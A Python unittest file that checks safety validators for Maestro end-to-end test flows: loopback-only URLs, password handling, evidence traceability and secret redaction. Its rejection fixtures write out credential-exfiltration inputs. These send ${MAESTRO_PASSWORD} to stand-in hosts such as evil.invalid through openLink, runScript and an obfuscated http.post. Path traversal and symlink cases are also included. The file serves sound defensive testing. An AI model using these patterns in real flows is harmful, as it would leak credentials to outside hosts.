from __future__ import annotations

import io
import json
import os
import sys
import tempfile
from pathlib import Path
import unittest
from unittest import mock


SCRIPTS_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SCRIPTS_DIR))

import check_test_automation as automation  # noqa: E402
import maestro_safety  # noqa: E402
import redact_maestro  # noqa: E402


class LoopbackURLTests(unittest.TestCase):
    def test_accepts_explicit_loopback_http_origins(self) -> None:
        for value in ("http://127.0.0.1:18585", "http://localhost:1"):
            with self.subTest(value=value):
                maestro_safety.validate_loopback_http_url(value)

    def test_rejects_ambiguous_or_non_loopback_urls(self) -> None:
        values = (
            "https://127.0.0.1:18585",
            "http://example.invalid:18585",
            "http://127.0.0.1:18585@evil.example",
            "http://localhost:18585.evil.example",
            "http://127.0.0.1",
            "http://127.0.0.1:",
            "http://127.0.0.1:0",
            "http://127.0.0.1:65536",
            "http://127.0.0.1:not-a-port",
            "http://127.0.0.1:18585/",
            "http://127.0.0.1:18585?next=//evil.example",
            "http://127.0.0.1:18585?",
            "http://127.0.0.1:18585#fragment",
            "http://127.0.0.1:18585#",
            "http://127.0.0.1:18585?#",
            "http://127.0.0.1:18585\nhttps://evil.example",
        )
        for value in values:
            with self.subTest(value=value):
                with self.assertRaises(maestro_safety.SafetyError):
                    maestro_safety.validate_loopback_http_url(value)

    def test_requires_exact_local_only_maestro_config(self) -> None:
        with tempfile.TemporaryDirectory() as raw:
            config = Path(raw) / "config.yaml"
            config.write_text(maestro_safety.EXPECTED_MAESTRO_CONFIG)
            maestro_safety.validate_maestro_config(config)

            config.write_text(
                maestro_safety.EXPECTED_MAESTRO_CONFIG
                + "onFlowStart:\n  - runScript: exfiltrate.js\n"
            )
            with self.assertRaises(maestro_safety.SafetyError):
                maestro_safety.validate_maestro_config(config)


class FlowSafetyTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name).resolve()
        self.flow = self.root / "e2e" / "maestro" / "flows" / "test.yaml"
        self.helpers = self.root / "e2e" / "maestro" / "helpers"
        self.flow.parent.mkdir(parents=True)
        self.helpers.mkdir(parents=True)
        self.root_patch = mock.patch.object(automation, "ROOT", self.root)
        self.helpers_patch = mock.patch.object(automation, "HELPERS_DIR", self.helpers)
        self.root_patch.start()
        self.helpers_patch.start()

    def tearDown(self) -> None:
        self.helpers_patch.stop()
        self.root_patch.stop()
        self.temporary.cleanup()

    def write_flow(self, body: str) -> None:
        self.flow.write_text(
            "url: ${MAESTRO_SERVER_URL}\n"
            "name: Safety fixture\n"
            "tags:\n"
            "  - lab\n"
            "---\n"
            "- inputText: ${MAESTRO_USERNAME}\n"
            "- inputText: ${MAESTRO_PASSWORD}\n"
            f"{body}"
        )

    def assert_rejected(self, body: str) -> None:
        self.write_flow(body)
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)

    def test_accepts_inline_conditional_subflow(self) -> None:
        self.write_flow(
            "- launchApp\n"
            "- runFlow:\n"
            "    when:\n"
            "      visible: Safe label\n"
            "    commands:\n"
            "      - tapOn: Safe label\n"
        )
        automation.validate_flow(self.flow)

    def test_accepts_and_validates_repository_helper(self) -> None:
        helper = self.helpers / "scroll.yaml"
        helper.write_text(
            "- repeat:\n"
            "    times: 2\n"
            "    commands:\n"
            "      - runFlow:\n"
            "          when:\n"
            "            notVisible:\n"
            "              id: ${TARGET_ID}\n"
            "          commands:\n"
            "            - swipe:\n"
            "                start: 10%,70%\n"
            "                end: 10%,60%\n"
        )
        self.write_flow("- runFlow: ../helpers/scroll.yaml\n")
        automation.validate_flow(self.flow)

    def test_rejects_exfiltration_capable_commands(self) -> None:
        bodies = (
            "- openLink: //example.invalid/${MAESTRO_PASSWORD}\n",
            "- runScript: scripts/exfiltrate.js\n",
            "- addMedia: /tmp/private-file\n",
            "- assertWithAI: Read this screen\n",
            "- assertNoDefectsWithAI\n",
            "- extractTextWithAI: Read this screen\n",
            "- launchApp:\n    appId: https:${MAESTRO_PASSWORD}//example.invalid\n",
            '- "openLink": //example.invalid/${MAESTRO_PASSWORD}\n',
            '- {openLink: "//example.invalid/${MAESTRO_PASSWORD}"}\n',
            '- {runScript: scripts/exfiltrate.js}\n',
            '- "runScript": scripts/exfiltrate.js\n',
            "-\n  runScript: scripts/exfiltrate.js\n",
            '- "launchApp":\n    appId: other-target\n',
            "- evalScript: ${MAESTRO_PASSWORD}\n",
            "- copyTextFrom: Password\n",
        )
        for body in bodies:
            with self.subTest(body=body):
                self.assert_rejected(body)

    def test_rejects_external_file_subflows(self) -> None:
        outside = self.root / "outside.yaml"
        outside.write_text("- tapOn: Unsafe\n")
        bodies = (
            "- runFlow: ../../../outside.yaml\n",
            "- runFlow:\n    file: ../../../outside.yaml\n",
            '- runFlow:\n    "file": ../../../outside.yaml\n',
        )
        for body in bodies:
            with self.subTest(body=body):
                self.assert_rejected(body)

    def test_rejects_password_interpolation_outside_input_text(self) -> None:
        bodies = (
            "- tapOn:\n    id: ${MAESTRO_PASSWORD}\n",
            "- assertVisible: ${MAESTRO_PASSWORD}\n",
            "- inputText: prefix-${MAESTRO_PASSWORD}\n",
            "- runFlow:\n    env:\n      TARGET_ID: ${MAESTRO_PASSWORD}\n    commands:\n      - tapOn: Safe\n",
            "- assertVisible: ${http.post('ht' + 'tps://evil.invalid', MAESTRO_PASSWORD)}\n",
            "- assertVisible: ${HOME}\n",
        )
        for body in bodies:
            with self.subTest(body=body):
                self.assert_rejected(body)

    def test_rejects_password_interpolation_in_header(self) -> None:
        self.flow.write_text(
            "url: ${MAESTRO_SERVER_URL}\n"
            "name: Safety fixture\n"
            "tags:\n"
            "  - lab\n"
            "env:\n"
            "  LEAK: ${MAESTRO_PASSWORD}\n"
            "---\n"
            "- inputText: ${MAESTRO_USERNAME}\n"
        )
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)

    def test_rejects_header_target_overrides(self) -> None:
        headers = (
            "url: https://evil.invalid",
            "appId: https://evil.invalid",
        )
        for override in headers:
            with self.subTest(override=override):
                self.flow.write_text(
                    "url: ${MAESTRO_SERVER_URL}\n"
                    "name: Safety fixture\n"
                    "tags:\n"
                    "  - lab\n"
                    f"{override}\n"
                    "---\n"
                    "- inputText: ${MAESTRO_USERNAME}\n"
                    "- inputText: ${MAESTRO_PASSWORD}\n"
                )
                with self.assertRaises(automation.ValidationError):
                    automation.validate_flow(self.flow)

    def test_rejects_symlinked_flow(self) -> None:
        target = self.root / "outside-flow.yaml"
        self.write_flow("- launchApp\n")
        self.flow.replace(target)
        self.flow.symlink_to(target)
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)

    def test_rejects_screenshot_capture(self) -> None:
        self.write_flow("- launchApp\n- takeScreenshot: evidence-auth-signed-in\n")
        with self.assertRaises(automation.ValidationError):
            automation.validate_flow(self.flow)


class TraceabilityValidatorTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name).resolve()
        self.manifest_path = self.root / "docs" / "testing" / "automation.json"
        self.coverage_plan_path = self.root / "docs" / "testing" / "coverage-plan.json"
        self.flows = self.root / "e2e" / "maestro" / "flows"
        self.helpers = self.root / "e2e" / "maestro" / "helpers"
        self.manifest_path.parent.mkdir(parents=True)
        self.flows.mkdir(parents=True)
        self.helpers.mkdir(parents=True)
        self.patch = mock.patch.multiple(
            automation,
            ROOT=self.root,
            MANIFEST=self.manifest_path,
            COVERAGE_PLAN=self.coverage_plan_path,
            FLOWS_DIR=self.flows,
            HELPERS_DIR=self.helpers,
        )
        self.patch.start()

        self.evidence = [
            (
                "AUTH-001",
                "maestro-flow",
                "e2e/maestro/flows/login.yaml",
                "Login flow",
                "maestro-web",
                ["maestro-web"],
                "url: ${MAESTRO_SERVER_URL}\n"
                "name: Login flow\n"
                "tags:\n"
                "  - lab\n"
                "---\n"
                "# AUTH-001\n"
                "- inputText: ${MAESTRO_USERNAME}\n"
                "- inputText: ${MAESTRO_PASSWORD}\n"
                "- launchApp\n",
            ),
            (
                "AUTH-002",
                "go-test",
                "server/internal/api/example_test.go",
                "TestServerThing",
                "go-api",
                ["go-api"],
                "package api\n\n// AUTH-002\nfunc TestServerThing(t *testing.T) {}\n",
            ),
            (
                "AUTH-003",
                "flutter-test",
                "app/test/example_test.dart",
                "shows the thing",
                "flutter-widget",
                ["flutter-widget"],
                "// AUTH-003\ntestWidgets('shows the thing', (tester) async {});\n",
            ),
            (
                "AUTH-004",
                "workflow-step",
                ".github/workflows/ci.yml",
                "CI step (AUTH-004)",
                "go-api",
                ["go-api", "repository-ci"],
                "jobs:\n  test:\n    steps:\n      - name: CI step (AUTH-004)\n",
            ),
            (
                "AUTH-005",
                "script-check",
                "scripts/check_fixture.sh",
                "AUTH-005 repository-check",
                "go-api",
                ["go-api", "repository-ci"],
                "CHECK_NAME='AUTH-005 repository-check'\n",
            ),
            (
                "AUTH-006",
                "patrol-test",
                "app/integration_test/native_test.dart",
                "launches the native app",
                "patrol-native",
                ["patrol-native"],
                "// AUTH-006\npatrolTest('launches the native app', ($) async {});\n",
            ),
        ]
        for _, _, relative, _, _, _, body in self.evidence:
            path = self.root / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(body)

        self.cases = {
            case_id: {"tags": {"AUTO"}, "priority": "P0", "file": "fixture", "line": 1}
            for case_id, *_ in self.evidence
        }
        self.plan = self.make_plan()
        self.manifest = self.make_manifest()
        self.write_plan(self.plan)
        self.write_manifest(self.manifest)

    def tearDown(self) -> None:
        self.patch.stop()
        self.temporary.cleanup()

    def make_plan(self) -> dict[str, object]:
        entries = [
            {
                "case_id": case_id,
                "dominant_layer": dominant,
                "disposition": "automatable",
                "recommended_layers": recommended,
            }
            for case_id, _, _, _, dominant, recommended, _ in self.evidence
        ]
        dominant_counts: dict[str, int] = {}
        for entry in entries:
            layer = entry["dominant_layer"]
            dominant_counts[layer] = dominant_counts.get(layer, 0) + 1
        return {
            "schema_version": 1,
            "methodology": {
                "purpose": "Plan fixture.",
                "dominant_layer": "One dominant layer.",
                "dispositions": {
                    "automatable": "Deterministic proof.",
                    "hybrid": "Automation plus external proof.",
                    "manual": "Human proof.",
                    "blocked": "Product gap.",
                },
                "live_policy": "Use disposable fixtures.",
                "completion_rule": "Prove every clause.",
            },
            "counts": {
                "total": len(entries),
                "dominant_layer": dominant_counts,
                "disposition": {"automatable": len(entries)},
            },
            "cases": entries,
        }

    def make_manifest(self) -> dict[str, object]:
        return {
            "schema_version": 2,
            "proofs": [
                {
                    "case_id": case_id,
                    "status": "automated",
                    "scope": f"Exact fixture proof for {case_id}.",
                    "evidence": [{"kind": kind, "path": path, "selector": selector}],
                }
                for case_id, kind, path, selector, *_ in self.evidence
            ],
        }

    def copy(self, value: object) -> object:
        return json.loads(json.dumps(value))

    def write_plan(self, value: object) -> None:
        self.coverage_plan_path.write_text(json.dumps(value))

    def write_manifest(self, value: object) -> None:
        self.manifest_path.write_text(json.dumps(value))

    def validated_plan(self) -> dict[str, dict[str, object]]:
        return automation.validate_coverage_plan(self.cases)

    def test_accepts_schema_v2_and_every_exact_evidence_kind(self) -> None:
        plan = self.validated_plan()
        automated, partial, flows = automation.validate_manifest(self.cases, plan)

        self.assertEqual((automated, partial), (6, 0))
        self.assertEqual(flows, {(self.root / self.evidence[0][2]).resolve()})

    def test_rejects_manifest_schema_fields_and_duplicate_case_proofs(self) -> None:
        for mutation in ("schema", "old-fields", "duplicate"):
            with self.subTest(mutation=mutation):
                manifest = self.copy(self.manifest)
                if mutation == "schema":
                    manifest["schema_version"] = 1
                elif mutation == "old-fields":
                    manifest["proofs"][0]["runner"] = "maestro-web"
                else:
                    manifest["proofs"].append(self.copy(manifest["proofs"][0]))
                self.write_manifest(manifest)
                with self.assertRaises(automation.ValidationError):
                    automation.validate_manifest(self.cases, self.validated_plan())

    def test_rejects_non_exact_selectors_for_every_evidence_kind(self) -> None:
        for index, (_, kind, *_rest) in enumerate(self.evidence):
            with self.subTest(kind=kind):
                manifest = self.copy(self.manifest)
                manifest["proofs"][index]["evidence"][0]["selector"] = "not the selector"
                self.write_manifest(manifest)
                with self.assertRaises(automation.ValidationError):
                    automation.validate_manifest(self.cases, self.validated_plan())

    def test_rejects_unsafe_or_kind_incompatible_evidence_paths(self) -> None:
        mutations = ("../outside.go", "scripts/check_fixture.sh")
        for path in mutations:
            with self.subTest(path=path):
                manifest = self.copy(self.manifest)
                manifest["proofs"][1]["evidence"][0]["path"] = path
                self.write_manifest(manifest)
                with self.assertRaises(automation.ValidationError):
                    automation.validate_manifest(self.cases, self.validated_plan())

    def test_rejects_evidence_without_its_catalog_id(self) -> None:
        path = self.root / self.evidence[1][2]
        path.write_text(path.read_text().replace("// AUTH-002\n", ""))
        with self.assertRaises(automation.ValidationError):
            automation.validate_manifest(self.cases, self.validated_plan())

    def test_rejects_catalog_id_attached_to_an_unrelated_test(self) -> None:
        path = self.root / self.evidence[1][2]
        path.write_text(
            "package api\n\n"
            "func TestServerThing(t *testing.T) {}\n\n"
            "// AUTH-002\n"
            "func TestUnrelated(t *testing.T) {}\n"
        )
        with self.assertRaisesRegex(automation.ValidationError, "annotation"):
            automation.validate_manifest(self.cases, self.validated_plan())

    def test_rejects_build_tagged_or_skipped_go_tests(self) -> None:
        path = self.root / self.evidence[1][2]
        bodies = (
            "//go:build special\n\npackage api\n\n"
            "// AUTH-002\nfunc TestServerThing(t *testing.T) {}\n",
            "package api\n\n// AUTH-002\n"
            "func TestServerThing(t *testing.T) { t.Skip(\"disabled\") }\n",
        )
        for body in bodies:
            with self.subTest(body=body):
                path.write_text(body)
                with self.assertRaises(automation.ValidationError):
                    automation.validate_manifest(self.cases, self.validated_plan())

    def test_rejects_commented_or_skipped_dart_tests(self) -> None:
        path = self.root / self.evidence[2][2]
        bodies = (
            "/*\n// AUTH-003\ntestWidgets('shows the thing', (tester) async {});\n*/\n",
            "// AUTH-003\ntestWidgets('shows the thing', (tester) async {}, skip: true);\n",
        )
        for body in bodies:
            with self.subTest(body=body):
                path.write_text(body)
                with self.assertRaises(automation.ValidationError):
                    automation.validate_manifest(self.cases, self.validated_plan())

    def test_rejects_evidence_outside_the_recommended_layers(self) -> None:
        plan = self.copy(self.plan)
        plan["cases"][3]["recommended_layers"] = ["go-api"]
        self.write_plan(plan)
        with self.assertRaises(automation.ValidationError):
            automation.validate_manifest(self.cases, self.validated_plan())

    def test_requires_auto_cases_to_have_automated_proofs(self) -> None:
        manifest = self.copy(self.manifest)
        manifest["proofs"][0]["status"] = "partial"
        self.write_manifest(manifest)
        with self.assertRaisesRegex(automation.ValidationError, "AUTO catalog cases"):
            automation.validate_manifest(self.cases, self.validated_plan())

        self.write_manifest(self.manifest)
        cases = {
            case_id: {**data, "tags": set(data["tags"])}
            for case_id, data in self.cases.items()
        }
        cases["AUTH-001"]["tags"] = set()
        with self.assertRaisesRegex(automation.ValidationError, "must carry the AUTO"):
            automation.validate_manifest(cases, automation.validate_coverage_plan(cases))

    def test_rejects_empty_scope_or_evidence(self) -> None:
        for field in ("scope", "evidence"):
            with self.subTest(field=field):
                manifest = self.copy(self.manifest)
                manifest["proofs"][0][field] = "" if field == "scope" else []
                self.write_manifest(manifest)
                with self.assertRaises(automation.ValidationError):
                    automation.validate_manifest(self.cases, self.validated_plan())

    def test_rejects_coverage_plan_schema_catalog_and_count_drift(self) -> None:
        for mutation in ("schema", "missing-case", "duplicate-case", "count"):
            with self.subTest(mutation=mutation):
                plan = self.copy(self.plan)
                if mutation == "schema":
                    plan["schema_version"] = 2
                elif mutation == "missing-case":
                    plan["cases"].pop()
                elif mutation == "duplicate-case":
                    plan["cases"].append(self.copy(plan["cases"][0]))
                else:
                    plan["counts"]["total"] -= 1
                self.write_plan(plan)
                with self.assertRaises(automation.ValidationError):
                    self.validated_plan()

    def test_rejects_invalid_plan_layers_dispositions_and_missing_dominant(self) -> None:
        for mutation in ("dominant", "disposition", "recommended", "missing-dominant"):
            with self.subTest(mutation=mutation):
                plan = self.copy(self.plan)
                entry = plan["cases"][0]
                if mutation == "dominant":
                    entry["dominant_layer"] = "unknown"
                elif mutation == "disposition":
                    entry["disposition"] = "unknown"
                elif mutation == "recommended":
                    entry["recommended_layers"] = ["unknown"]
                else:
                    entry["recommended_layers"] = ["go-api"]
                self.write_plan(plan)
                with self.assertRaises(automation.ValidationError):
                    self.validated_plan()

    def test_requires_gap_and_blocked_classification_to_match(self) -> None:
        plan = self.copy(self.plan)
        plan["cases"][0]["disposition"] = "blocked"
        plan["counts"]["disposition"] = {
            "automatable": len(self.evidence) - 1,
            "blocked": 1,
        }
        self.write_plan(plan)
        with self.assertRaisesRegex(automation.ValidationError, "catalog carries GAP"):
            self.validated_plan()

    def test_rejects_automated_proof_for_hybrid_case(self) -> None:
        plan = self.copy(self.plan)
        plan["cases"][0]["disposition"] = "hybrid"
        plan["counts"]["disposition"] = {
            "automatable": len(self.evidence) - 1,
            "hybrid": 1,
        }
        self.write_plan(plan)
        validated = self.validated_plan()
        with self.assertRaisesRegex(automation.ValidationError, "automatable disposition"):
            automation.validate_manifest(self.cases, validated)


class RedactionTests(unittest.TestCase):
    def test_sanitizes_text_and_binary_artifacts(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            text_artifact = root / "commands.json"
            binary_artifact = root / "screenshot.bin"
            text_artifact.write_text(f'{{"password":"{secret}"}}')
            binary_artifact.write_bytes(b"prefix\x00" + secret.encode() + b"\xffsuffix")

            self.assertEqual(redact_maestro.sanitize_tree(root, [secret]), 0)

            self.assertNotIn(secret.encode(), text_artifact.read_bytes())
            self.assertNotIn(secret.encode(), binary_artifact.read_bytes())
            self.assertIn(redact_maestro.REDACTION.encode(), text_artifact.read_bytes())
            self.assertIn(redact_maestro.REDACTION.encode(), binary_artifact.read_bytes())

    def test_stream_redacts_repeated_and_non_newline_occurrences(self) -> None:
        source = io.StringIO("secret once secret\nfinal-secret")
        destination = io.StringIO()
        with mock.patch.object(sys, "stdin", source), mock.patch.object(sys, "stdout", destination):
            self.assertEqual(redact_maestro.stream(["secret"]), 0)
        self.assertEqual(
            destination.getvalue(),
            f"{redact_maestro.REDACTION} once {redact_maestro.REDACTION}\n"
            f"final-{redact_maestro.REDACTION}",
        )

    def test_cli_requires_a_nonempty_password(self) -> None:
        with mock.patch.dict(os.environ, {}, clear=True), mock.patch.object(
            sys, "argv", ["redact_maestro.py", "stream"]
        ), mock.patch.object(sys, "stderr", io.StringIO()):
            self.assertEqual(redact_maestro.main(), 2)

    def test_rejects_artifact_symlink_without_touching_target(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw) / "artifacts"
            root.mkdir()
            target = Path(raw) / "outside.txt"
            target.write_text(secret)
            (root / "linked.txt").symlink_to(target)

            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])
            self.assertEqual(target.read_text(), secret)

    def test_rejects_secret_bearing_artifact_filename(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            (root / f"failure-{secret}.txt").write_text("safe contents")
            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])

    def test_rejects_secret_bearing_directory_name(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw)
            (root / f"failure-{secret}").mkdir()
            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])

    def test_rejects_symlinked_artifact_root_without_touching_target(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            outside = Path(raw) / "outside"
            outside.mkdir()
            target = outside / "victim.txt"
            target.write_text(secret)
            root = Path(raw) / "artifacts"
            root.symlink_to(outside, target_is_directory=True)

            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])
            self.assertEqual(target.read_text(), secret)

    def test_rejects_hardlinked_artifact_without_touching_target(self) -> None:
        secret = "generated-lab-password"
        with tempfile.TemporaryDirectory() as raw:
            root = Path(raw) / "artifacts"
            root.mkdir()
            target = Path(raw) / "outside.txt"
            target.write_text(secret)
            os.link(target, root / "linked.txt")

            with self.assertRaises(RuntimeError):
                redact_maestro.sanitize_tree(root, [secret])
            self.assertEqual(target.read_text(), secret)


if __name__ == "__main__":
    unittest.main()
